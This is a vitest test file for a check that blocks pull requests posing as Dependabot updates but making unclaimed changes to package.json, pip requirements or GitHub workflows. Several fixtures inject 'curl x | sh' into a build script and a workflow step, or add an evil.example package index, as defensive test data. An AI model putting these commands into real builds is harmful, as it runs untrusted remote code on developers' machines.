import { describe, expect, it } from 'vitest';
import { decideDependabot } from '../../../src/checks/dependabot/index.js';
import type { FileChange, PullRequestFacts } from '../../../src/policy.js';

const DEPENDABOT = { login: 'dependabot[bot]', type: 'Bot' };

const manifest = (deps: Record<string, string>, extra: Record<string, unknown> = {}) =>
  JSON.stringify({ name: 'app', scripts: { build: 'tsup' }, ...extra, devDependencies: deps });

const PKG: FileChange = {
  path: 'package.json',
  baseText: manifest({ prettier: '^3.9.8', vitest: '^4.0.0' }),
  headText: manifest({ prettier: '^3.9.9', vitest: '^4.0.0' }),
};

const WORKFLOW = (checkout: string, extraStep = '') =>
  `on: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@${checkout}\n      - run: pnpm test\n${extraStep}`;

const ACTION_BUMP: FileChange = {
  path: '.github/workflows/ci.yml',
  baseText: WORKFLOW('v4'),
  headText: WORKFLOW('v5'),
};

/** A clean single-package Dependabot PR bumping prettier; override to break it. */
function pr(overrides: Partial<PullRequestFacts> = {}): PullRequestFacts {
  return {
    title: 'chore(deps-dev): bump prettier from 3.9.8 to 3.9.9',
    body: 'Bumps [prettier](https://github.com/prettier/prettier) from 3.9.8 to 3.9.9.',
    author: DEPENDABOT,
    labels: ['dependencies'],
    changedFiles: ['package.json', 'pnpm-lock.yaml'],
    workflowChanges: [],
    manifestChanges: [PKG],
    signOffs: [],
    ...overrides,
  };
}

const blocks = (facts: PullRequestFacts) =>
  decideDependabot(facts)
    .findings.filter((finding) => finding.effect === 'block')
    .map((finding) => finding.message);

describe('decideDependabot — scope', () => {
  it('ignores a PR a person opened, however it looks', () => {
    const facts = pr({ author: { login: 'reed', type: 'User' }, changedFiles: ['src/a.ts'] });
    expect(decideDependabot(facts).findings).toEqual([]);
  });

  it('passes a PR whose content matches its claim, and says the lockfile was not read', () => {
    const { findings } = decideDependabot(pr());
    expect(findings.map((finding) => finding.effect)).toEqual(['info', 'info']);
    expect(findings[0]?.headline).toBe(true);
    expect(findings[1]?.message).toContain('`pnpm-lock.yaml`');
  });
});

describe('decideDependabot — the claim', () => {
  it('blocks when the description no longer names any update', () => {
    expect(blocks(pr({ body: 'Updated deps.' }))[0]).toContain('names no update');
  });

  it("blocks when the title's package isn't among the claims", () => {
    const facts = pr({ title: 'chore(deps): bump left-pad from 1.0.0 to 1.1.0' });
    expect(blocks(facts)[0]).toContain('title bumps `left-pad`');
  });

  it('passes a group title, which names no package', () => {
    expect(blocks(pr({ title: 'chore(deps-dev): bump the dev group with 1 update' }))).toEqual([]);
  });
});

describe('decideDependabot — paths', () => {
  it('blocks a path Dependabot never edits', () => {
    const facts = pr({ changedFiles: ['package.json', 'pnpm-lock.yaml', 'src/index.ts'] });
    expect(blocks(facts)).toEqual([
      expect.stringContaining("`src/index.ts` isn't a dependency file"),
    ]);
  });

  it("allows another ecosystem's manifest, reported as unverified rather than checked", () => {
    const facts = pr({ changedFiles: ['package.json', 'Dockerfile'] });
    expect(blocks(facts)).toEqual([]);
    expect(decideDependabot(facts).findings[1]?.message).toContain('`Dockerfile`');
  });

  it('does not treat a package.json under node_modules as a manifest', () => {
    const facts = pr({ changedFiles: ['package.json', 'node_modules/x/package.json'] });
    expect(blocks(facts)).toHaveLength(1);
  });
});

describe('decideDependabot — npm manifests', () => {
  it('blocks an unclaimed dependency change', () => {
    const change = { ...PKG, headText: manifest({ prettier: '^3.9.9', vitest: '^4.1.0' }) };
    expect(blocks(pr({ manifestChanges: [change] }))).toEqual([
      expect.stringContaining('changes `vitest` (`^4.0.0` → `^4.1.0`)'),
    ]);
  });

  it('blocks an added dependency the description does not claim', () => {
    const change = {
      ...PKG,
      headText: manifest({ prettier: '^3.9.9', vitest: '^4.0.0', evil: '1.0.0' }),
    };
    expect(blocks(pr({ manifestChanges: [change] }))[0]).toContain('`evil`');
  });

  it('blocks a claimed package moved to a version other than the claimed one', () => {
    const change = { ...PKG, headText: manifest({ prettier: '^3.9.10', vitest: '^4.0.0' }) };
    expect(blocks(pr({ manifestChanges: [change] }))[0]).toContain('claims 3.9.9');
  });

  it('blocks a non-dependency field change, such as a script', () => {
    const change = {
      ...PKG,
      headText: manifest(
        { prettier: '^3.9.9', vitest: '^4.0.0' },
        { scripts: { build: 'curl x | sh' } },
      ),
    };
    expect(blocks(pr({ manifestChanges: [change] }))[0]).toContain('changes `scripts`');
  });

  it('passes a claimed override and packageManager bump', () => {
    const before = manifest(
      {},
      { packageManager: 'pnpm@10.1.0+sha512.aa', pnpm: { overrides: { 'a>glob': '^10.0.0' } } },
    );
    const after = manifest(
      {},
      { packageManager: 'pnpm@10.2.0+sha512.bb', pnpm: { overrides: { 'a>glob': '^10.1.0' } } },
    );
    const facts = pr({
      title: 'chore(deps): bump the tooling group with 2 updates',
      body: 'Updates `pnpm` from 10.1.0 to 10.2.0\nUpdates `glob` from 10.0.0 to 10.1.0',
      manifestChanges: [{ path: 'package.json', baseText: before, headText: after }],
    });
    expect(blocks(facts)).toEqual([]);
  });

  it('passes a claimed package that changed only in the lockfile', () => {
    const facts = pr({ manifestChanges: [], changedFiles: ['pnpm-lock.yaml'] });
    expect(blocks(facts)).toEqual([]);
  });

  it('blocks a manifest that was added or deleted', () => {
    const change = { path: 'package.json', headText: PKG.headText };
    expect(blocks(pr({ manifestChanges: [change] }))[0]).toContain('added or deleted');
  });

  it('blocks a manifest that no longer parses', () => {
    const change = { ...PKG, headText: '{' };
    expect(blocks(pr({ manifestChanges: [change] }))[0]).toContain("doesn't parse");
  });
});

describe('decideDependabot — pip requirements', () => {
  const REQS = (black: string, extra = '') => `black==${black}\nruff==0.6.0\n${extra}`;
  const pip = (headText: string): Partial<PullRequestFacts> => ({
    title: 'chore(deps-dev): bump black from 24.1.0 to 24.2.0',
    body: 'Bumps [Black](https://github.com/psf/black) from 24.1.0 to 24.2.0.',
    changedFiles: ['requirements-dev.txt'],
    manifestChanges: [{ path: 'requirements-dev.txt', baseText: REQS('24.1.0'), headText }],
  });

  it('passes the claimed pin, matching names case-insensitively', () => {
    expect(blocks(pr(pip(REQS('24.2.0'))))).toEqual([]);
  });

  it('blocks an unclaimed pin change', () => {
    expect(blocks(pr(pip('black==24.2.0\nruff==0.7.0\n')))[0]).toContain('`ruff`');
  });

  it('blocks a new include or index line', () => {
    const facts = pr(pip(REQS('24.2.0', '--extra-index-url https://evil.example/simple')));
    expect(blocks(facts)[0]).toContain('lines other than pinned requirements');
  });
});

describe('decideDependabot — github-actions', () => {
  const actions = (change: FileChange): Partial<PullRequestFacts> => ({
    title: 'chore(deps): bump actions/checkout from 4 to 5',
    body: 'Bumps [actions/checkout](https://github.com/actions/checkout) from 4 to 5.',
    changedFiles: [change.path],
    manifestChanges: [],
    workflowChanges: [change],
  });

  it('passes a claimed pin bump', () => {
    expect(blocks(pr(actions(ACTION_BUMP)))).toEqual([]);
  });

  it('blocks a workflow edit beyond the pins', () => {
    const change = { ...ACTION_BUMP, headText: WORKFLOW('v5', '      - run: curl x | sh\n') };
    expect(blocks(pr(actions(change)))[0]).toContain('changes more than action refs');
  });

  it('blocks an unclaimed action moved alongside the claimed one', () => {
    const change = {
      ...ACTION_BUMP,
      headText: WORKFLOW('v5').replace('- run: pnpm test', '- uses: evil/action@v2'),
      baseText: WORKFLOW('v4').replace('- run: pnpm test', '- uses: evil/action@v1'),
    };
    expect(blocks(pr(actions(change)))).toEqual([expect.stringContaining('`evil/action`')]);
  });

  it('blocks a workflow Dependabot added', () => {
    const change = { path: '.github/workflows/new.yml', headText: WORKFLOW('v5') };
    expect(blocks(pr(actions(change)))[0]).toContain('added or deleted');
  });
});
